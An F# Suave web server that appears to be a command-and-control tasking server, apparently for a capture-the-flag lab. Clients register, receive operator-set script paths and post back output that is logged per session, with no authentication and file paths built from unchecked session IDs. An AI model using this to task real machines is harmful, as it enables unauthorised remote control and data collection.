open System
open System.IO
open System.Net
open System.Collections.Concurrent
open Suave
open Suave.Filters
open Suave.Operators
open Suave.Successful
open Suave.RequestErrors
open Suave.Files

// Define the root directory to serve files from
let rootDirectory = AppDomain.CurrentDomain.BaseDirectory

// Dictionary to keep track of clients and their details
let clients = ConcurrentDictionary<string, string>()
let clientSessions = ConcurrentDictionary<string, string>()
let mutable sessionCounter = 1

let generateSessionId () =
    let sessionId = sprintf "Session%d" sessionCounter
    sessionCounter <- sessionCounter + 1
    sessionId

// Function to log received data
let logData (data: string) (sessionId: string) =
    try
        let logDir = Path.Combine(rootDirectory, "clients", sessionId)
        if not (Directory.Exists(logDir)) then
            Directory.CreateDirectory(logDir) |> ignore
        let logFile = Path.Combine(logDir, "log.txt")
        File.AppendAllText(logFile, $"{DateTime.Now}: {data}{Environment.NewLine}")
    with
    | ex -> printfn "Error logging data: %s" ex.Message

// Define the web server configuration
let config =
    { defaultConfig with
        bindings = [ HttpBinding.createSimple HTTP "0.0.0.0" 8000 ] }

// Define the web app
let app =
    choose [
        GET >=> choose [
            path "/" >=> file (Path.Combine(rootDirectory, "index.html"))
            path "/flag.txt" >=> file (Path.Combine(rootDirectory, "flag.txt"))
            path "/DefaultScript.txt" >=> file (Path.Combine(rootDirectory, "DefaultScript.txt"))
            path "/currentScript" >=> request (fun r ->
                match r.queryParam "clientId" with
                | Choice1Of2 clientId ->
                    match clients.TryGetValue(clientId) with
                    | true, scriptPath -> Successful.OK scriptPath
                    | false, _ -> RequestErrors.NOT_FOUND "Client not found"
                | Choice2Of2 _ -> RequestErrors.BAD_REQUEST "Client ID not provided"
            )
            path "/clients" >=> request (fun _ ->
                let clientList = 
                    clientSessions
                    |> Seq.map (fun kvp -> 
                        let clientId = kvp.Value
                        let clientDetails = clients.[clientId]
                        sprintf "%s (Details: %s)" kvp.Key clientDetails)
                    |> String.concat ", "
                Successful.OK clientList
            )
            pathScan "/clients/%s" (fun sessionId ->
                let logDir = Path.Combine(rootDirectory, "clients", sessionId)
                let logFile = Path.Combine(logDir, "log.txt")
                if File.Exists(logFile) then
                    let logContent = File.ReadAllText(logFile)
                    Successful.OK logContent
                else
                    RequestErrors.NOT_FOUND "Log file not found"
            )
            pathScan "/clients/%s/currentScript" (fun sessionId ->
                match clientSessions.TryGetValue(sessionId) with
                | true, clientId ->
                    match clients.TryGetValue(clientId) with
                    | true, scriptPath -> Successful.OK scriptPath
                    | false, _ -> RequestErrors.NOT_FOUND "Client not found"
                | false, _ -> RequestErrors.NOT_FOUND "Session not found"
            )
            browseHome
        ]
        POST >=> choose [
            path "/receiveOutput" >=> request (fun r ->
                match r.queryParam "clientId" with
                | Choice1Of2 sessionId ->
                    let data = System.Text.Encoding.UTF8.GetString(r.rawForm)
                    logData data sessionId
                    Successful.OK "Data received and logged"
                | Choice2Of2 _ -> RequestErrors.BAD_REQUEST "Client ID not provided"
            )
            path "/setScript" >=> request (fun r ->
                match r.queryParam "clientId" with
                | Choice1Of2 sessionId ->
                    let newScriptPath = System.Text.Encoding.UTF8.GetString(r.rawForm).Trim()
                    match clientSessions.TryGetValue(sessionId) with
                    | true, clientId ->
                        clients.AddOrUpdate(clientId, newScriptPath, fun _ _ -> newScriptPath) |> ignore
                        Successful.OK $"Script path set to {newScriptPath} for client {clientId}"
                    | false, _ -> RequestErrors.NOT_FOUND "Session not found"
                | Choice2Of2 _ -> RequestErrors.BAD_REQUEST "Client ID not provided"
            )
            path "/registerClient" >=> request (fun r ->
                match r.rawForm |> System.Text.Encoding.UTF8.GetString |> Option.ofObj with
                | Some clientDetails ->
                    let clientId = clientDetails.Split('_').[0]
                    let sessionId = generateSessionId()
                    clients.TryAdd(clientId, clientDetails) |> ignore
                    clientSessions.TryAdd(sessionId, clientId) |> ignore

                    // Create client directory
                    let clientDir = Path.Combine(rootDirectory, "clients", sessionId)
                    if not (Directory.Exists(clientDir)) then
                        Directory.CreateDirectory(clientDir) |> ignore

                    // Create a specific directory for current script
                    let scriptDir = Path.Combine(rootDirectory, "scripts", "currentscript", sessionId)
                    if not (Directory.Exists(scriptDir)) then
                        Directory.CreateDirectory(scriptDir) |> ignore

                    Successful.OK $"Client {clientDetails} registered with session {sessionId}"
                | None -> RequestErrors.BAD_REQUEST "Client details not provided"
            )
        ]
    ]

// Start the web server
startWebServer config app
